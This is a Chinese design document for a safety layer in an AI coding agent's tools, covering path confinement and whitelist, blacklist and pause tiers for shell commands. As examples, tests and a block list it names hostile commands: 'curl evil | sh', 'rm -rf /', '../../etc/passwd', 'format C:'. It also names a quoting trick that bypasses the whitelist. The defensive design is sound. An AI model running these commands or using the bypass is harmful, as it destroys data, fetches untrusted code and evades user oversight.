# Design 004:工具安全层(路径约束 + run_command 分级)

> **Status**: Approved(路径 B)
> **前身**: Design 003(工具测试框架)
> **决策来源**: 用户确认——路径约束 + run_command 白名单/PAUSE 分级;项目根 = CWD。
> **未来**: Ash 成熟后,run_command 的 shell 后端换成 Ash,白名单层退役,沙箱由 Ash 接管。

---

## 1. 问题

musk 的 9 个工具直接操作文件系统/执行 shell,**无任何边界**:
- 文件类工具可读写项目外文件(`read_file("../../etc/passwd")`)
- run_command 可执行任意 shell(`rm -rf /` / `curl evil | sh`)
- auto-forge 跑不通的经验表明:AI 幻觉可能调错工具或传危险参数,没有护栏就会造成实际破坏

## 2. 为什么 shell 无法静态沙箱(根因)

`run_command` 跑的是系统 shell(`cmd /C` / `sh -c`)。shell 是图灵完备的:
- 静态分析命令字符串无法可靠判断它最终碰哪些文件(混淆/嵌套/变量)
- `type ..\..\secrets`、`echo x > ..\evil`、`curl | sh` 都能绕过路径白名单

**结论**:文件路径可静态约束(可靠);shell 命令不可静态约束。

## 3. 分层防护(路径 B)

### 3.1 第一层:文件类工具的路径约束(可靠,本次实现)

给 `read_file`/`write_file`/`edit_file`/`batch_replace`/`glob`/`search`/`list_dir`/`list_symbols` 全部加:

```
项目根 = CWD(musk 启动时的工作目录)
任何路径参数 → 规范化(canonicalize)→ 必须在项目根之下(或等于)→ 否则拒绝
```

**可靠**:单个文件路径的规范化 + 比较是确定性的,没有 shell 的图灵完备问题。

实现要点:
- `..` 穿越:规范化后检查 `starts_with(project_root)`
- 绝对路径:必须在根下
- 符号链接:canonicalize 会解析,所以链接到外部也会被挡
- 根本身(CWD):允许(根目录自身是合法的)

### 3.2 第二层:run_command 白名单/PAUSE 分级(过渡,本次实现)

run_command 的执行后端设计为**可替换**,当前用系统 shell,将来换 Ash。

分级逻辑:
```
命令前缀匹配 →
  白名单(cargo/npm/git/echo/ls/type/cat/dir/cd/mkdir/touch/test/pytest/…)
    → 直接执行,返回结果
  黑名单(rm -rf/del /s/format/mkfs/shutdown/curl|wget 管道 sh…)
    → 返回 PAUSE(强警告),需用户确认
  其他(未知)
    → 返回 PAUSE(普通提醒),需用户确认
```

**PAUSE 机制**:工具不执行命令,返回一个特殊结果(非 Err,而是 `Paused { cmd, reason }`)。agent 循环看到 Paused → 通过 SSE 通知前端 → 用户 approve → 重新调用工具(带 `force: true` 标记跳过白名单检查)→ 执行。

> 首期实现:工具返回 Paused 字符串(告诉 agent "这条命令需要用户确认");完整的 SSE→前端确认→重试闭环留到 web app 有 PAUSE UI 时。现在 agent 看到 Paused 会把它当作结果传给 LLM,LLM 自然会向用户说明。

### 3.3 第三层(未来):Ash 沙箱

当 Ash(auto-lang/auto-shell 的自有 shell)成熟:
1. run_command 的执行后端从 `cmd/sh` 换成 Ash
2. Ash 每条内置命令(cat/ls/rm/cp/...)的实现里插入沙箱:操作文件时检查路径、执行子进程时检查白名单、网络时检查权限
3. 因为**每条命令都是我们自己实现的**,所以无论如何组合脚本,最终操作点都会触发检查——无法绕过
4. 届时第二层的命令前缀白名单退役,由 Ash 的细粒度沙箱接管

**为什么 Ash 能根治**:普通 shell 的危险在于它是"黑盒"——我们无法控制它内核态的文件操作。Ash 是自己的实现,每个操作原语(打开文件/创建进程/connect socket)都是我们的代码,在这里拦截 = 必然触发。

---

## 4. 项目根的确定

**CWD(musk 启动时的工作目录)** = 项目根。

- `musk run` / `musk chat` 在哪个目录启动,哪个就是根
- 路径约束用 `std::env::current_dir()` 获取(启动时快照一次,避免运行中被 chdir 改变)
- 未来可加 `project_root` 到 app-config 显式覆盖

---

## 5. 实现计划

### 5.1 路径约束模块(`tool_safety.rs`,新)

```rust
/// 工具安全层:路径约束 + run_command 分级(Design 004)。
/// 项目根 = 启动时的 CWD 快照。

/// 检查 path 是否在项目根之下(允许根本身)。规范化后比较。
pub fn is_within_project(path: &str) -> bool { ... }

/// 规范化路径参数:相对路径基于项目根解析,`..` 穿透被 canonicalize 拦截。
/// 返回:Ok(canonical_path) 或 Err(越界理由)。
pub fn resolve_within_project(path: &str) -> Result<PathBuf, String> { ... }

/// run_command 分级:返回是否白名单/黑名单/需确认。
pub enum CommandTier { Allowed, NeedsApproval(String) }
pub fn classify_command(cmd: &str) -> CommandTier { ... }
```

### 5.2 给文件类工具加约束

每个工具的 `execute` 开头,把 `path`/`base_dir` 参数过一遍 `resolve_within_project()`。越界 → `Err`。

### 5.3 run_command 分级

`execute` 开头:`classify_command(cmd)`。
- `Allowed` → 执行(现有逻辑)
- `NeedsApproval` 且 `args["force"] != true` → 返回 Paused 字符串
- `NeedsApproval` 且 `force == true` → 执行

### 5.4 测试

在 tool_atoms 框架里加安全用例:
- `read_file("../../etc/passwd")` → Err(越界)
- `write_file("../out.txt", ...)` → Err(越界)
- `run_command("echo safe")` → Ok(白名单)
- `run_command("format C:")` → Paused(黑名单)
- `run_command("some-unknown-cmd")` → Paused(未知)

---

## 6. 边界与限制

- ✅ 文件路径约束可靠(canonicalize + starts_with)
- ✅ run_command 白名单挡住常见危险命令
- ⚠️ run_command 白名单可被命令变形绕过(如 `car''go test`)——这是已知限制,等 Ash 根治
- ⏸ PAUSE 的完整 SSE→前端确认闭环留到 web app 有确认 UI 时
- ⏸ 符号链接:canonicalize 会解析,但若链接在根内指向根外,canonicalize 后会被挡(安全)
